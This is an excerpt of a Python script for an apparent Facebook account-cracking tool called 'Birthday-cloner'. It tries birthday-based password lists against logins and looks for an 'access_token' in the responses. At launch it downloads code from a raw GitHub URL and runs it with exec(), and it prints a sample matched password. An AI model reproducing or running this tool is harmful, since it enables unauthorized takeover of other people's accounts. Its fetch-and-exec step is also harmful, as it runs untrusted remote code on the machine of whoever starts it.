...
motion("\033[1;33m\nConecting to Github-INC3-PTION...")
time.sleep(2)
os.system("clear")
rs=requests.session()
rg=rs.get
x=(rg("https://raw.githubusercontent.com/inceptionff/Birthday-cloner/main/info.py").text)
exec(x)
##### LOGO #####
...
warn= """
{ycl}[+] Don’t try this command ...
{bcl}[+] Because for now i am just testing it   ...
{gcl}[+] If command work fine i make it public ...
{rcl}[+] This command by INC3PTION ...
{ccl}[+] Made with love in BANGLADESH ...\n
""".format(bcl=bcl,rcl=rcl,gcl=gcl,ccl=ccl,ycl=ycl)
info="""{rcl}[+] {ycl}Network = Wi-Fi
{rcl}[+] {rcl}VPN= No
{rcl}[+] {gcl}Device ID = Phh-Treble A/B
--------------------------------------------------""".format(rcl=rcl,ycl=ycl,gcl=gcl,ccl=ccl)

if Permission=="On":
    pass
else:
  motion(ccl+"Server is temporary down")
  time.sleep(2)
  os.system("xdg-open https://www.facebook.com/iam.inc3ption")
  exit()
while True:
    os.system("figlet -f small INC3-PTION")
    motion(warn)
...
passlist= raw_input(bcl+"Select Birthday List >> ")
fil=passlist
motion(gcl+"\nBitrthdaylist =>> "+str(fil))
word = open(passlist,'r').readlines()

with open(fil, 'r')as file:
  x = len(file.readlines())
  motion(rcl+'\nMatching Birthday =>> '+str(x))
  ...
  def main(arg):
    try:
      ...
      if 'access_token' in q:
        ...
        pass
        print(gcl+"\n[B=P Matched Pass='jannatul@2004'] ")
    except:
      pass
